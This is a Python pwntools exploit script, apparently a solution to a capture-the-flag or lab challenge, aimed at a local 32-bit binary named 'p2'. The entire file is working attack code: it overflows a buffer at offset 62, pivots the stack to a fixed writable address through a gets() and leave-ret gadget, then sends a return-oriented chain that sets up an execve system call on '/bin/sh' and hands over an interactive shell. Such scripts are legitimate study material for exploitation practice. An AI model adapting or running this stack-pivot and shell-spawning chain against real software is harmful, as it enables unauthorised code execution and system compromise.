#!/usr/bin/env python
from pwn import *
# context.log_level = 'debug'
context.arch = 'i386'
p = process('./p2')
elf = ELF('./p2')
g = lambda x: next(elf.search(asm(x)))
vul = elf.symbols['vul']
pop_ebp_ret = g('pop ebp ; ret')
# leave_ret = g('leave ; ret')
pop_eax_ret = g('pop eax ; ret') # 0x080b8126
pop_ebx_ret = g('pop ebx ; ret') # 0x080481c9
pop_ecx_ret = g('pop ecx ; ret') # 0x080de849
pop_edx_ret = g('pop edx ; ret') # 0x0806edca
int_0x80_ret = g('int 0x80 ; ret') 
buf = 0x080eb000 - 100
gadget1 = 0x8048898
# gadget1 has gets() and leave_ret
# 8048898:       50                      push   eax
# 8048899:       e8 e2 69 00 00          call   804f280 <_IO_gets>
# 804889e:       83 c4 10                add    esp,0x10
# 80488a1:       90                      nop
# 80488a2:       c9                      leave  
# 80488a3:       c3                      ret 
offset = 62
migration = [
	pop_ebp_ret, 
	buf - 4, 
	pop_eax_ret, 
	buf, 
	gadget1, 
]
rop = [
	pop_eax_ret, 
	0xb, 
	pop_ebx_ret, 
	buf + 9 * 4, 
	pop_ecx_ret, 
	0, 
	pop_edx_ret, 
	0, 
	int_0x80_ret
]
raw_input('payload1 @ send => ')
payload = 'A' * offset + ''.join(map(p32, migration))
p.sendline(payload)
raw_input('payload2 @ send => ')
payload = ''.join(map(p32, rop)) + '/bin/sh\x00'
p.sendline(payload)
p.interactive()
